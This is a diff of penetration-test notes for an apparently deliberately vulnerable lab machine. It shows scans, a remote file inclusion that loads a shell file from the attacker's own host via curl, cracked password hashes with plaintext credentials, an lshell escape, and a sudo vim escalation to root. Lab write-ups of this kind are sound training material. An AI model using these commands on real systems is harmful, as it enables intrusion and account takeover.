@@ -16,6 +16,18 @@ Note: Some users report the box may seem to be "unstable" with aggressive scanni
 Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.
 
 
+Modification file /etc/netplan/50-cloud-init.yaml
+    
+    # login : patrick/P@ssw0rd25
+    # /etc/netplan/50-cloud-init.yaml
+    network:
+        ethernets:
+            enp0s17:
+                addresses: []
+                dhcp4: true
+                optional: true
+        version: 2
+
 
 └─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.19
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -176,7 +188,7 @@ HOP RTT     ADDRESS
 
 
 
-└─$ enum4linux -a 192.168.110.19                                                                                                                                                        1 ⨯
+└─$ enum4linux -a 192.168.110.19
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr 17 07:59:09 2021
 
  ========================== 
@@ -304,21 +316,19 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 GENERATED WORDS: 4612                                                          
 
 ---- Scanning URL: http://192.168.110.19:8080/ ----
-+ http://192.168.110.19:8080/_vti_bin (CODE:200|SIZE:154)                                                                                                                                  
-+ http://192.168.110.19:8080/_vti_cnf (CODE:200|SIZE:154)                                                                                                                                  
-+ http://192.168.110.19:8080/_vti_pvt (CODE:200|SIZE:154)                                                                                                                                  
-+ http://192.168.110.19:8080/about (CODE:200|SIZE:936)                                                                                                                                     
-==> DIRECTORY: http://192.168.110.19:8080/aspnet_client/                                                                                                                                   
-+ http://192.168.110.19:8080/development (CODE:200|SIZE:576)                                                                                                                               
-+ http://192.168.110.19:8080/error (CODE:200|SIZE:29)                                                                                                                                      
-+ http://192.168.110.19:8080/index.html (CODE:200|SIZE:560)                                                                                                                                
-+ http://192.168.110.19:8080/root (CODE:200|SIZE:144)                                                                                                                                      
-+ http://192.168.110.19:8080/server-status (CODE:403|SIZE:289)                                                                                                                             
-                                                                                                                                                                                           
++ http://192.168.110.19:8080/_vti_bin (CODE:200|SIZE:154)
++ http://192.168.110.19:8080/_vti_cnf (CODE:200|SIZE:154)
++ http://192.168.110.19:8080/_vti_pvt (CODE:200|SIZE:154)
++ http://192.168.110.19:8080/about (CODE:200|SIZE:936)
+==> DIRECTORY: http://192.168.110.19:8080/aspnet_client/
++ http://192.168.110.19:8080/development (CODE:200|SIZE:576)
++ http://192.168.110.19:8080/error (CODE:200|SIZE:29)
++ http://192.168.110.19:8080/index.html (CODE:200|SIZE:560)
++ http://192.168.110.19:8080/root (CODE:200|SIZE:144)
++ http://192.168.110.19:8080/server-status (CODE:403|SIZE:289)
 ---- Entering directory: http://192.168.110.19:8080/aspnet_client/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                               
 -----------------
 END_TIME: Sat Apr 17 08:01:51 2021
 DOWNLOADED: 4612 - FOUND: 9
@@ -523,12 +533,18 @@ This is the property of Good Tech. All rights reserved.
 </html> 
 
 
+
+Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335
+Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 336
+
+
 http://www.example.com/[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell] 
 
 
 Deprecated: Function ereg_replace() is deprecated in /var/www/html/developmentsecretpage/slogin_lib.inc.php on line 335
 
 └─$ curl http://192.168.110.19:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=http://192.168.110.1:8888/cmd.txt
+└─$ curl http://192.168.110.19:8080/developmentsecretpage/slogin_lib.inc.php?slogin_path=slog_users.txt 
 
 
 
@@ -544,7 +560,7 @@ https://md5.gromweb.com/?md5=4a8a2b374f463b7aedbb44a066363b81
 admin	:	3cb1d13bb83ffff2defe8d1443d3a0eb	[ Unfound ]
 intern	:	4a8a2b374f463b7aedbb44a066363b81	12345678900987654321
 patrick	:	87e6d56ce79af90dbe07d387d3d0579e	P@ssw0rd25
-qiu	:		ee64497098d0926d198f54f6d5431f98	qiu 
+qiu	:	ee64497098d0926d198f54f6d5431f98	qiu 
 
 
 S-1-22-1-1000 Unix User\admin (Local User)
@@ -555,12 +571,11 @@ S-1-22-1-1004 Unix User\ossecm (Local User)
 S-1-22-1-1005 Unix User\ossecr (Local User)
 
 
-
+intern:~$ echo $SHELL
+/usr/local/bin/lshell
 intern:~$ os.system('/bin/bash')
 intern@development:~$ id
 uid=1002(intern) gid=1006(intern) groups=1006(intern)
-
-
 intern@development:~$ env
 SSH_CONNECTION=192.168.110.20 46394 192.168.110.19 22
 LANG=en_US.UTF-8
@@ -582,29 +597,24 @@ LOGNAME=intern
 XDG_RUNTIME_DIR=/run/user/1002
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
 _=/usr/bin/env
-
-
-intern@development:~$ cat work.txt
-1. Tell Patrick that shoutbox is not working. We need to revert to the old method to update David about shoutbox. For new, we will use the old director's landing page.
-2. Patrick's start of the third year in this company!
-3. Attend the meeting to discuss if password policy should be relooked at.
-
-
-intern@development:~/access$ ls -al
-total 40
-drwxrwxrwx 9 intern intern 4096 Jul 16  2018 .
-drwxr-xr-x 6 intern intern 4096 Apr 17 16:01 ..
-drwxr-xr-x 2 root   root   4096 Jul 15  2018 IA64
--rw-rw-r-- 1 intern intern  210 Jul 16  2018 tcpdump.txt
-drwxr-xr-x 2 root   root   4096 Jul 15  2018 W32ALPHA
-drwxr-xr-x 2 root   root   4096 Jul 15  2018 W32MIPS
-drwxr-xr-x 2 root   root   4096 Jul 15  2018 W32PPC
-drwxr-xr-x 2 root   root   4096 Jul 15  2018 W32X86
-drwxr-xr-x 2 root   root   4096 Jul 15  2018 WIN40
-drwxr-xr-x 2 root   root   4096 Jul 15  2018 x64
-
-
-patrick@development:~$ sudo /usr/bin/vim
-
+cat /etc/passwd
+...
+intern:x:1002:1006::/home/intern:/usr/local/bin/lshell
+...
+intern@development:~$ su patrick
+Password: P@ssw0rd25
+patrick@development:/home/intern$ sudo -l
+Matching Defaults entries for patrick on development:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User patrick may run the following commands on development:
+    (ALL) NOPASSWD: /usr/bin/vim
+    (ALL) NOPASSWD: /bin/nano
+patrick@development:/home/intern$ sudo /usr/bin/vim
+[sudo] password for patrick: P@ssw0rd25 
+:shell
 root@development:~# id
 uid=0(root) gid=0(root) groups=0(root)
+
+root@development:/etc/ssh# cat sshd_config
+
+AllowUsers admin intern
